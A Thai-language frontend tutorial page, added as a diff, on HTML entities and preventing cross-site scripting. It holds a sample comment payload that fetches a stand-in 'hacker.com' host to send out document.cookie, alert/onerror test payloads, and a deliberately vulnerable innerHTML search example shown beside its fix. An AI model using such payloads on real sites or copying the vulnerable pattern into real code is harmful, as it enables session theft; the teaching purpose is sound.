@@ -1,0 +1,117 @@
+---
+title: Entities & XSS
+category: Frontend
+parentTitle: HTML5
+version: HTML Living Standard
+updatedAt: 2026-10-17
+---
+
+## 1. แนวคิด (Concept)
+
+ในภาษา HTML มีตัวอักษรบางตัวที่เป็น **"อักขระสงวนของระบบ (Reserved Characters)"** เช่น เครื่องหมายน้อยกว่า (`<`) และมากกว่า (`>`) ซึ่งเบราว์เซอร์จะเข้าใจว่านี่คือจุดเริ่มต้นหรือสิ้นสุดของแท็ก HTML เสมอ
+
+หากเราต้องการแสดงเครื่องหมายเหล่านี้บนหน้าจอจริง หรือรับข้อความจากผู้ใช้มาแสดงผล เราจำเป็นต้องแปลงอักขระเหล่านั้นให้อยู่ในรูป **HTML Entities (Character Reference)** เช่น:
+- `<` แปลงเป็น `&lt;` (Less Than)
+- `>` แปลงเป็น `&gt;` (Greater Than)
+- `&` แปลงเป็น `&amp;` (Ampersand)
+- `"` แปลงเป็น `&quot;` (Double Quote)
+- `'` แปลงเป็น `&#39;` (Single Quote)
+
+กระบวนการนี้เป็นหัวใจสำคัญในการสกัดกั้นภัยคุกคามอันดับ 1 ของหน้าเว็บ นั่นคือ **Cross-Site Scripting (XSS)**
+
+---
+
+## 2. หลักการเบื้องหลัง (Under the Hood)
+
+### XSS เกิดขึ้นได้อย่างไรเมื่อลืม Escape?
+สมมติว่าในระบบคอมเมนต์บล็อก มีผู้ใช้พิมพ์ข้อความนี้ลงในช่องแสดงความคิดเห็น:
+```html
+ยอดเยี่ยมมาก! <script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
+```
+หากระบบนำข้อความนี้ไปแสดงผลตรงๆ ด้วย `element.innerHTML = commentText`:
+1. เบราว์เซอร์จะ Parse เครื่องหมาย `<script>` ในฐานะโค้ดคำสั่งจริง
+2. โค้ดของแฮกเกอร์จะถูกรันบนเครื่องของทุกคนที่เปิดเข้ามาอ่านคอมเมนต์นี้
+3. ข้อมูลคุกกี้และเซสชัน (JWT/Session Token) ของผู้ใช้จะถูกขโมยส่งไปยังเซิร์ฟเวอร์ของแฮกเกอร์ทันที
+
+### การทำงานของ HTML Entity Encoding
+เมื่อแปลง `<` เป็น `&lt;` และ `>` เป็น `&gt;`:
+- เบราว์เซอร์จะทราบว่าข้อความนี้คือ **"ข้อมูลตัวหนังสือบริสุทธิ์ (Data String)"** ไม่ใช่คำสั่งแท็ก
+- ข้อความบนหน้าจอจะยังคงแสดงรูปตัวอักษร `<script>` ให้คนอ่านเห็นตามปกติ แต่เอนจินของเบราว์เซอร์จะไม่นำไปรันเป็นโค้ด
+
+---
+
+## 3. ตัวอย่างโค้ด (HTML5 & TypeScript)
+
+### ตัวอย่างที่ 1: การ Escape ข้อความใน Pure JavaScript
+
+```typescript filename="security-utils.ts"
+// ฟังก์ชันสำหรับแปลงอักขระอันตรายให้เป็น HTML Entities อย่างปลอดภัย
+export function escapeHtml(unsafeText: string): string {
+  return unsafeText
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+// ตัวอย่างการใช้งาน:
+const userBio = 'สวัสดีครับ ผมเขียนโค้ด <script>alert("hack")</script>';
+const safeHtml = escapeHtml(userBio);
+console.log(safeHtml);
+// ผลลัพธ์: สวัสดีครับ ผมเขียนโค้ด &lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;
+```
+
+### ตัวอย่างที่ 2: การใช้ `textContent` ป้องกัน XSS อัตโนมัติในฝั่ง Client
+
+```javascript filename="render-comment.js"
+const commentContainer = document.getElementById('comment-box');
+const rawUserInput = '<img src="x" onerror="alert(\'XSS Attack!\')">';
+
+// ✅ วิธีที่ปลอดภัย: textContent จะทำการ Escape อักขระทั้งหมดโดยอัตโนมัติ
+commentContainer.textContent = rawUserInput; 
+// หน้าจอจะแสดงตัวหนังสือ '<img src="x" onerror="..."> ' อย่างปลอดภัย ไม่เกิด popup alert ใดๆ
+```
+
+---
+
+## 4. โค้ดที่มักเขียนผิด vs โค้ดที่ถูกต้อง
+
+### ❌ โค้ดที่ผิด: ใช้ `innerHTML` กับข้อมูลที่ส่งมาจากผู้ใช้
+
+```javascript
+// ผิดมหันต์: ช่องโหว่ XSS ระดับวิกฤต (Critical Vulnerability)
+const searchKeyword = new URLSearchParams(window.location.search).get('q');
+document.getElementById('search-result').innerHTML = `ผลการค้นหาสำหรับ: ${searchKeyword}`;
+```
+
+### ✅ โค้ดที่ถูกต้อง: ใช้ `textContent` หรือ Framework Auto-escaping
+
+```javascript
+// ถูกต้อง: ใช้ textContent หรือ innerText
+const searchKeyword = new URLSearchParams(window.location.search).get('q');
+const container = document.getElementById('search-result');
+container.textContent = `ผลการค้นหาสำหรับ: ${searchKeyword}`;
+```
+
+---
+
+## 5. ควรใช้เมื่อไหร่ / ไม่ควรใช้เมื่อไหร่
+
+### ควรทำ
+- ทำการ Escape ข้อมูลทั้งหมดที่รับมาจาก User Input, URL Query Parameters, หรือฐานข้อมูล ก่อนนำไปแปะลงใน HTML DOM เสมอ
+- หากใช้งานร่วมกับ React/Next.js ระบบจะทำ **Auto-escaping ใน JSX** ให้อัตโนมัติอยู่แล้ว `{commentText}`
+
+### ไม่ควรทำ
+- **ห้ามใช้ `innerHTML` หรือ React `dangerouslySetInnerHTML`** กับข้อมูลที่ไม่ผ่านการตรวจกรองและ Sanitize ด้วยไลบรารีความปลอดภัย (เช่น DOMPurify) เป็นอันขาด
+
+---
+
+## 6. คำถามสัมภาษณ์งาน (Interview Questions)
+
+### Q1: ทำไมการใช้ `element.textContent` จึงปลอดภัยกว่าการใช้ `element.innerHTML`?
+**แนวทางคำตอบ**: เพราะ `innerHTML` จะสั่งให้ HTML Parser ของเบราว์เซอร์ตีความข้อความสตริงนั้นในฐานะมาร์กอัป HTML ซึ่งหากข้อความนั้นมีแท็ก `<script>` หรือ Event Handler อันตราย เช่น `<img src="invalid" onerror="...">` โค้ดจะถูกรันทันที (เกิด XSS) 
+ในทางกลับกัน `textContent` จะสั่งให้เบราว์เซอร์มองข้อความทั้งหมดเป็น **Text Node ดิบ** เพียงอย่างเดียว โดยไม่มีการส่งต่อไปยัง HTML Parser อักขระพิเศษอย่าง `<` หรือ `>` จะถูกแสดงเป็นตัวหนังสือบนจอเฉยๆ โดยไม่มีวันถูกรันเป็นสคริปต์
+
+### Q2: ในโปรเจกต์ React หากจำเป็นต้องแสดงผล Rich Text (เช่น เนื้อหาจาก WYSIWYG Editor) ควรทำอย่างไรให้ปลอดภัยจาก XSS?
+**แนวทางคำตอบ**: ควรใช้ไลบรารีสำหรับทำ HTML Sanitization โดยเฉพาะ เช่น **`dompurify`** หรือ **`sanitize-html`** เพื่อลบแท็กอันตราย (`<script>`, `<iframe>`, `<object>`) และแอตทริบิวต์เสี่ยง (`onerror`, `onclick`, `javascript:...`) ออกไปให้หมดก่อน แล้วจึงนำผลลัพธ์ที่ผ่านการฆ่าเชื้อแล้วส่งต่อไปเรนเดอร์ผ่าน `dangerouslySetInnerHTML={{ __html: cleanHtml }}`
